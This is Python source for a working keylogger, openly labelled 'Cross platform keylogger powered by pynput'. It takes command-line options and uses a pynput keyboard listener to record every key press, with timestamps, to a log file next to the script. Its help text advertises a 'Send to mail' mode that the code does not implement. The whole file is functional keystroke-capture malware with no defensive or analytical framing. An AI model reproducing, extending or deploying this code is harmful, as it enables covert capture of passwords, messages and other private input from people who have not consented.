import logging, os, argparse, sys, threading

from pynput.keyboard import Key, Listener

mode = 0
path = os.path.join(os.path.abspath(os.path.dirname(sys.argv[0])),"log.txt")
#path = "/Users/machina/Desktop/log.txt"
log_type = 1

def _GetArgs () :
	global mode, path, log_type

	parser = argparse.ArgumentParser(description="Cross platform keylogger powered by pynput")

	help = {
		mode : "Mode (0 : Log to text 1 : Send to mail)[default = {}]".format(mode) ,
		path : "Path for log file [default = {}]".format(path) ,
		log_type : "Log date and time [default = {}]".format(log_type)
	}

	parser.add_argument("-x", "--mode", type=int, default=mode, help=help[mode])
	parser.add_argument("-p", "--path", type=str, default=path ,help=help[path])
	parser.add_argument("-d", "--log_type", type=int, default=log_type, help=help[log_type])

	args = parser.parse_args()

	mode = args.mode
	path = args.path
	log_type = args.log_type

def main () :

	def on_press (key) :
		logging.info(str(key))


	if (log_type == 1) :
		log_format = "%(asctime)s: %(message)s"
	else :
		log_format = ""
	
	logging.basicConfig(filename =path, level=logging.DEBUG, format=log_format)

	with Listener(on_press=on_press) as listener:
		listener.join()





if __name__ == "__main__":
	_GetArgs()
	print(path)
	main()